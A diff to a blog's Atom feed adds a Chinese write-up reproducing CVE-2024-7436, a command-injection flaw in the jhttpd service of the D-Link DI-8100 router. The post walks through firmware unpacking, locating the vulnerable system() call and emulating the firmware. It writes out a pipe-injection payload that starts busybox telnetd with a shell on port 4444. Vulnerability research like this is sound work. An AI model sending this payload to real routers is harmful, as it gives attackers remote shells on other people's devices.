@@ -10,7 +10,25 @@
   <rights>All rights reserved 2026, SAKURA</rights>
   <subtitle>记录 · 思考 · 分享</subtitle>
   <title>我的博客</title>
-  <updated>2026-10-08T12:03:34.000Z</updated>
+  <updated>2026-10-08T12:07:31.000Z</updated>
+  <entry>
+    <author>
+      <name>SAKURA</name>
+    </author>
+    <category term="技术笔记" scheme="https://jianglingge.github.io/categories/%E6%8A%80%E6%9C%AF%E7%AC%94%E8%AE%B0/"/>
+    <category term="漏洞分析" scheme="https://jianglingge.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
+    <category term="IoT" scheme="https://jianglingge.github.io/tags/IoT/"/>
+    <category term="CVE" scheme="https://jianglingge.github.io/tags/CVE/"/>
+    <content>
+      <![CDATA[<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>下载固件后使用binwalk解包</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">binwalk -Me DI_8100-16.07.26A1.zip</span><br></pre></td></tr></table></figure><p><img src="/img/cve-2024-7436/01.png"></p><p>进入解包后的目录</p><p>使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./firmwalker.sh /home/blonet/下载/_DI_8100-16.07.26A1.zip.extracted/_DI_8100-16.07.26A1.trx.extracted/_8C.extracted/_3F8000.extracted/cpio-root</span><br></pre></td></tr></table></figure><p>查找到jhttpd文件</p><p><img src="/img/cve-2024-7436/02.png"></p><p>分析与jhttpd有关的rc</p><p>根据别人写的cve也是成功找到危险函数system</p><p><img src="/img/cve-2024-7436/03.png"></p><p>执行v10，v10由v28而来</p><p><img src="/img/cve-2024-7436/04.png"></p><p>v28由v16拼接字符串</p><p><img src="/img/cve-2024-7436/05.png"></p><p>那么就有一个命令执行漏洞</p><p>再看前面的if条件</p><p><img src="/img/cve-2024-7436/06.png"></p><p>flag 是路由器，决定执行哪条命令</p><p>是cmd时才会执行漏洞函数</p><p>先看命令模板wys %s &gt; &#x2F;tmp&#x2F;msp.info  wys 里有一个命令表 gl_order_str</p><p>直接传 cmd&#x3D;ls，wys 查表，表里没有ls，拒绝执行，no order,please help。</p><p>要用管道符 | 绕过</p><p>因为直接使用不了命令，也是通过丰富的经验知道通过busybox去调用</p><h1 id="固件模拟"><a href="#固件模拟" class="headerlink" title="固件模拟"></a>固件模拟</h1><p>使用firmae模拟</p><p><img src="/img/cve-2024-7436/07.png"></p><p><img src="/img/cve-2024-7436/08.png"></p><p>进入到路由器管理页面（账号密码依旧丰富的经验，但也可以找到）</p><p><img src="/img/cve-2024-7436/09.png"></p><p>然后用bp拦截改数据flag&#x3D;cmd&amp;cmd&#x3D;|&#x2F;bin&#x2F;busybox%20telnetd%20-l%20&#x2F;bin&#x2F;sh%20-p%204444</p><p>发送</p><p><img src="/img/cve-2024-7436/10.png"></p><h1 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h1><p>查看固件的busybox</p><p><img src="/img/cve-2024-7436/11.png"></p><p>有telentd可以反弹shell</p><p><img src="/img/cve-2024-7436/12.png"></p>]]>
+    </content>
+    <id>https://jianglingge.github.io/2026/10/08/cve-2024-7436-dlink-di-8100/</id>
+    <link href="https://jianglingge.github.io/2026/10/08/cve-2024-7436-dlink-di-8100/"/>
+    <published>2026-10-08T12:07:31.000Z</published>
+    <summary>对 D-Link DI-8100 路由器 jhttpd 组件中 CVE-2024-7436 命令执行漏洞的复现记录，包含固件解包、漏洞点定位、固件模拟与反弹 shell 的完整过程。</summary>
+    <title>CVE-2024-7436 D-Link DI-8100 命令执行漏洞分析</title>
+    <updated>2026-10-08T12:07:31.000Z</updated>
+  </entry>
   <entry>
     <author>
       <name>SAKURA</name>
